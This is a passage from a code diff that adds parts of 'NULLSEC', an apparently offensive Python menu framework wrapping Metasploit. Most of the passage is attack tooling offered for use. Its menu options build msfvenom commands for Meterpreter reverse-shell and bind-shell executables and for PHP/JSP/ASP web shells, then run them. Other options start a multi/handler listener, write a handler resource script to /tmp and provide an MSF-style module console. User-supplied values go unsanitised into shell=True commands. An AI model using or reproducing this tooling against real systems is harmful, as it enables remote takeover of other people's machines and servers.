+        platform = input(f"{Colors.WHITE}  Platform (windows/linux/osx): {Colors.RESET}") or "windows"
+        output = input(f"{Colors.WHITE}  Output file: {Colors.RESET}") or "payload.exe"
+        cmd = f"msfvenom -p {platform}/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o {output}"
+        print(f"\n{Colors.GREEN}[*] Running: {cmd}{Colors.RESET}")
+        subprocess.run(cmd, shell=True)
+        input(f"\n{Colors.YELLOW}Press ENTER to continue...{Colors.RESET}")
+    elif choice == '7':
+        print(f"\n{Colors.CYAN}Generating Bind Shell...{Colors.RESET}")
+        lport = input(f"{Colors.WHITE}  LPORT: {Colors.RESET}") or "4444"
+        platform = input(f"{Colors.WHITE}  Platform (windows/linux/osx): {Colors.RESET}") or "windows"
+        output = input(f"{Colors.WHITE}  Output file: {Colors.RESET}") or "bind_payload.exe"
+        cmd = f"msfvenom -p {platform}/meterpreter/bind_tcp LPORT={lport} -f exe -o {output}"
+        print(f"\n{Colors.GREEN}[*] Running: {cmd}{Colors.RESET}")
+        subprocess.run(cmd, shell=True)
+        input(f"\n{Colors.YELLOW}Press ENTER to continue...{Colors.RESET}")
+    elif choice == '8':
+        print(f"\n{Colors.CYAN}Generating Web Payload...{Colors.RESET}")
+        lhost = input(f"{Colors.WHITE}  LHOST: {Colors.RESET}")
+        lport = input(f"{Colors.WHITE}  LPORT: {Colors.RESET}") or "4444"
+        payload_type = input(f"{Colors.WHITE}  Type (php/jsp/asp): {Colors.RESET}") or "php"
+        output = input(f"{Colors.WHITE}  Output file: {Colors.RESET}") or f"shell.{payload_type}"
+        cmd = f"msfvenom -p {payload_type}/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f raw -o {output}"
+        print(f"\n{Colors.GREEN}[*] Running: {cmd}{Colors.RESET}")
+        subprocess.run(cmd, shell=True)
+        input(f"\n{Colors.YELLOW}Press ENTER to continue...{Colors.RESET}")
+    elif choice == '9':
+        print(f"\n{Colors.CYAN}Multi Handler Setup{Colors.RESET}")
+        lhost = input(f"{Colors.WHITE}  LHOST: {Colors.RESET}")
+        lport = input(f"{Colors.WHITE}  LPORT: {Colors.RESET}") or "4444"
+        payload = input(f"{Colors.WHITE}  Payload: {Colors.RESET}") or "windows/meterpreter/reverse_tcp"
+        cmd = f"msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD {payload}; set LHOST {lhost}; set LPORT {lport}; exploit'"
+        subprocess.run(cmd, shell=True)
+    elif choice == '10':
+        print(f"\n{Colors.CYAN}Resource Script Generator{Colors.RESET}")
+        print(f"{Colors.DIM}Creating automated MSF resource script...{Colors.RESET}")
+        script_content = """use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 0.0.0.0
+set LPORT 4444
+set ExitOnSession false
+exploit -j -z
+"""
+        with open("/tmp/nullsec_handler.rc", "w") as f:
+            f.write(script_content)
+        print(f"{Colors.GREEN}[+] Created: /tmp/nullsec_handler.rc{Colors.RESET}")
+        print(f"{Colors.CYAN}Run with: msfconsole -r /tmp/nullsec_handler.rc{Colors.RESET}")
+        input(f"\n{Colors.YELLOW}Press ENTER to continue...{Colors.RESET}")
+
+def framework_console():
+    """Interactive NULLSEC Framework Console (MSF-style)"""
+    clear_screen()
+    print(f"""
+{Colors.RED}
+    ███▓   ██▓██▓   ██▓██▓     ██▓     ███████▓███████▓ ██████▓
+    ████▓  ██████   ██████     ███     ██▓━━━━▓██▓━━━━▓██▓━━━━▓
+    ██▓██▓ ██████   ██████     ███     ███████▓█████▓  ███     
+    ███▓██▓██████   ██████     ███     ▓━━━━█████▓━━▓  ███     
+    ███ ▓█████▓██████▓▓███████▓███████▓███████████████▓▓██████▓
+    ▓━▓  ▓━━━▓ ▓━━━━━▓ ▓━━━━━━▓▓━━━━━━▓▓━━━━━━▓▓━━━━━━▓ ▓━━━━━▓
+{Colors.RESET}
+{Colors.MAGENTA}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Colors.RESET}
+{Colors.WHITE}                    NULLSEC FRAMEWORK CONSOLE{Colors.RESET}
+{Colors.CYAN}                      Interactive Command Shell{Colors.RESET}
+{Colors.DIM}                   Type 'help' for available commands{Colors.RESET}
+{Colors.MAGENTA}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Colors.RESET}
+""")
+    
+    context = {"target": None, "module": None, "options": {}}
+    
+    while True:
+        try:
+            prompt = f"{Colors.RED}nullsec{Colors.RESET}"
+            if context["module"]:
+                prompt += f"{Colors.CYAN}({context['module']['name']}){Colors.RESET}"
+            prompt += f" {Colors.WHITE}>{Colors.RESET} "
+            
+            cmd = input(prompt).strip().lower()
+            
+            if not cmd:
+                continue
+            elif cmd in ['exit', 'quit', 'q']:
+                break
+            elif cmd == 'help':
+                print(f"""
+{Colors.CYAN}Available Commands:{Colors.RESET}
+  {Colors.YELLOW}use <id>{Colors.RESET}         - Select a module by ID
+  {Colors.YELLOW}show modules{Colors.RESET}     - List all available modules  
+  {Colors.YELLOW}show options{Colors.RESET}     - Show module options
+  {Colors.YELLOW}set <opt> <val>{Colors.RESET}  - Set an option value
+  {Colors.YELLOW}run{Colors.RESET}              - Execute the selected module
+  {Colors.YELLOW}exploit{Colors.RESET}          - Alias for 'run'
+  {Colors.YELLOW}back{Colors.RESET}             - Deselect current module
+  {Colors.YELLOW}search <term>{Colors.RESET}    - Search for modules
+  {Colors.YELLOW}info{Colors.RESET}             - Show module information
+  {Colors.YELLOW}msfconsole{Colors.RESET}       - Launch Metasploit
+  {Colors.YELLOW}clear{Colors.RESET}            - Clear screen
+  {Colors.YELLOW}help{Colors.RESET}             - Show this help
+  {Colors.YELLOW}exit{Colors.RESET}             - Exit framework console
+""")
+            elif cmd == 'show modules':
+                print(f"\n{Colors.CYAN}NULLSEC Modules:{Colors.RESET}")
+                for mod in MODULES[:20]:
+                    print(f"  {Colors.RED}[{mod['id']:2d}]{Colors.RESET} {mod['icon']} {mod['name']} - {mod['desc']}")
+                print(f"  {Colors.DIM}... and {len(MODULES) - 20} more{Colors.RESET}\n")
+            elif cmd.startswith('use '):
+                try:
+                    mod_id = int(cmd.split()[1])
+                    mod = next((m for m in MODULES if m['id'] == mod_id), None)
+                    if mod:
+                        context["module"] = mod
+                        print(f"{Colors.GREEN}[+] Module selected: {mod['name']}{Colors.RESET}")
+                    else:
+                        print(f"{Colors.RED}[-] Module not found{Colors.RESET}")
+                except (ValueError, IndexError):
+                    print(f"{Colors.RED}[-] Invalid module ID{Colors.RESET}")
+            elif cmd == 'show options':
+                if context["module"]:
+                    print(f"\n{Colors.CYAN}Module:{Colors.RESET} {context['module']['name']}")
+                    print(f"{Colors.CYAN}Description:{Colors.RESET} {context['module']['desc']}")
+                    print(f"{Colors.CYAN}Category:{Colors.RESET} {context['module']['category']}")
+                    print(f"{Colors.CYAN}Script:{Colors.RESET} {context['module']['script']}\n")
+                else:
+                    print(f"{Colors.YELLOW}[*] No module selected. Use 'use <id>'{Colors.RESET}")
+            elif cmd in ['run', 'exploit']:
+                if context["module"]:
+                    run_module(context["module"])
+                else:
+                    print(f"{Colors.YELLOW}[*] No module selected{Colors.RESET}")
+            elif cmd == 'back':
+                context["module"] = None
+                print(f"{Colors.YELLOW}[*] Module deselected{Colors.RESET}")
+            elif cmd.startswith('search '):
+                query = cmd[7:].strip()
+                results = [m for m in MODULES if query in m['name'].lower() or query in m['desc'].lower()]
+                if results:
+                    print(f"\n{Colors.GREEN}Found {len(results)} modules:{Colors.RESET}")
+                    for mod in results[:10]:
+                        print(f"  {Colors.RED}[{mod['id']:2d}]{Colors.RESET} {mod['name']} - {mod['desc']}")
+                    if len(results) > 10:
+                        print(f"  {Colors.DIM}... and {len(results) - 10} more{Colors.RESET}")
+                else:
+                    print(f"{Colors.RED}[-] No matches found{Colors.RESET}")
+            elif cmd == 'info':
+                if context["module"]:
+                    mod = context["module"]
+                    print(f"""
+{Colors.CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Colors.RESET}
+{Colors.WHITE}  Module Information{Colors.RESET}
+{Colors.CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Colors.RESET}
+  {Colors.YELLOW}Name:{Colors.RESET}        {mod['name']}
+  {Colors.YELLOW}Icon:{Colors.RESET}        {mod['icon']}
+  {Colors.YELLOW}Category:{Colors.RESET}    {mod['category']}
+  {Colors.YELLOW}Description:{Colors.RESET} {mod['desc']}
+  {Colors.YELLOW}Script:{Colors.RESET}      {mod['script']}
+  {Colors.YELLOW}ID:{Colors.RESET}          {mod['id']}
+{Colors.CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Colors.RESET}
+""")
+                else:
+                    print(f"{Colors.YELLOW}[*] No module selected{Colors.RESET}")
+            elif cmd == 'msfconsole':
+                print(f"\n{Colors.GREEN}[*] Launching Metasploit Framework...{Colors.RESET}")
+                subprocess.run(['msfconsole'])
+            elif cmd == 'clear':
+                clear_screen()
+            else:
+                print(f"{Colors.RED}[-] Unknown command. Type 'help' for available commands{Colors.RESET}")
+        
+        except KeyboardInterrupt:
+            print(f"\n{Colors.YELLOW}[*] Use 'exit' to quit{Colors.RESET}")
+    
+    print(f"{Colors.GREEN}[*] Exiting framework console{Colors.RESET}")
+    time.sleep(0.5)
+
+def show_credits():
+    clear_screen()
+    print(f"""
+{Colors.RED}
+ ███▄    █  █    ██  ██▓     ██▓      ██████ ▓█████  ▄████▄  
+ ██ ▀█   █  ██  ▓██▒▓██▒    ▓██▒    ▒██    ▒ ▓█   ▀ ▒██▀ ▀█  
+▓██  ▀█ ██▒▓██  ▒██░▒██░    ▒██░    ░ ▓██▄   ▒███   ▒▓█    ▄ 
+▓██▒  ▐▌██▒▓▓█  ░██░▒██░    ▒██░      ▒   ██▒▒▓█  ▄ ▒▓▓▄ ▄██▒
+▒██░   ▓██░▒▒█████▓ ░██████▒░██████▒▒██████▒▒░▒████▒▒ ▓███▀ ░
+{Colors.CYAN}
+    ╺━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╸
+              ☠  OFFENSIVE SECURITY OPERATIONS FRAMEWORK  ☠       
+    ╺━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╸
+                                                                   
+      {Colors.YELLOW}System:{Colors.WHITE} nullsec-Linux (v1.1) - MSF Integration{Colors.CYAN}                
+                                                                   
+    ╺━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╸
+      {Colors.WHITE}Developed by:{Colors.CYAN}                                                
+      {Colors.MAGENTA}bad-antics development{Colors.CYAN}                                      
+      {Colors.DIM}github.com/bad-antics{Colors.CYAN}                                       
+    ╺━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╸
+                                                                   
+      {Colors.GREEN}• 62 Custom Attack Modules{Colors.CYAN}                                  
+      {Colors.GREEN}• Metasploit Framework Integration{Colors.CYAN}                          
+      {Colors.GREEN}• Interactive Console Interface{Colors.CYAN}                             
+      {Colors.GREEN}• live + Test Mode Operations{Colors.CYAN}                               
+      {Colors.GREEN}• Multi-Category Attack Coverage{Colors.CYAN}                            
+                                                                   
+    ╺━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╸
+      {Colors.YELLOW}⚠  FOR AUTHORIZED SECURITY TESTING ONLY  ⚠{Colors.CYAN}                 
+                                                                   
+      {Colors.DIM}This framework is designed for professional{Colors.CYAN}                
+      {Colors.DIM}penetration testers and red team operators.{Colors.CYAN}                
+      {Colors.DIM}Unauthorized access to computer systems is illegal.{Colors.CYAN}        
+    ╺━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╸
+{Colors.RESET}
+""")
+    input(f"{Colors.WHITE}  Press ENTER to continue...{Colors.RESET}")
+
+
+def main():
+    page = 0
+    page_size = 15
+    total_pages = (len(MODULES) + page_size - 1) // page_size
+    
+    while True:
+        clear_screen()
+        print_banner()
+        print_menu(page, page_size)
+        
+        choice = input(f"{Colors.WHITE}  Enter choice: {Colors.RESET}").strip().lower()
+        
+        if choice == 'q':
+            clear_screen()
+            print(f"""
+{Colors.RED}
+ ███▄    █  █    ██  ██▓     ██▓      ██████ ▓█████  ▄████▄  
+ ██ ▀█   █  ██  ▓██▒▓██▒    ▓██▒    ▒██    ▒ ▓█   ▀ ▒██▀ ▀█  
+▓██  ▀█ ██▒▓██  ▒██░▒██░    ▒██░    ░ ▓██▄   ▒███   ▒▓█    ▄ 
+{Colors.CYAN}
+    ╺━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╸
+              ☠  NULLSEC OPERATIONS TERMINATED  ☠                 
+    ╺━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╸
+                                                                   
+              Stay dangerous. Stay anonymous.                      
+                                                                   
+              {Colors.MAGENTA}bad-antics development{Colors.CYAN}                              
+              {Colors.DIM}github.com/bad-antics{Colors.CYAN}                                 
+    ╺━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╸
+{Colors.RESET}
+""")
+            sys.exit(0)
+        
+        elif choice == 'n':
+            page = (page + 1) % total_pages
+        elif choice == 'p':
+            page = (page - 1) % total_pages
+        elif choice == 'a':
+            run_all_modules()
+        elif choice == 'r':
+            run_random_module()
+        elif choice == 'c':
+            category_filter()
+        elif choice == 's':
+            search_modules()
+        elif choice == 'e':
+            command_console()
+        elif choice == 'm':
+            msf_integration()
+        elif choice == 'f':
+            framework_console()
+        elif choice == 'h':
+            shodan_search()
+        elif choice == 't':
+            tool_launcher_menu()
+        elif choice == 'x':
+            show_credits()
+        elif choice == 'i':
+            launch_ai_console()
+        else:
+            try:
+                mod_id = int(choice)
+                mod = next((m for m in MODULES if m['id'] == mod_id), None)
+                if mod:
+                    run_module(mod)
+                else:
+                    print(f"{Colors.RED}[!] Invalid module number{Colors.RESET}")
+                    time.sleep(1)
+            except ValueError:
+                print(f"{Colors.RED}[!] Invalid option{Colors.RESET}")
+                time.sleep(1)
+
+if __name__ == "__main__":
+    try:
+        main()
+    except KeyboardInterrupt:
+        print(f"\n\n{Colors.RED}[!] Interrupted{Colors.RESET}\n")
+        sys.exit(0)
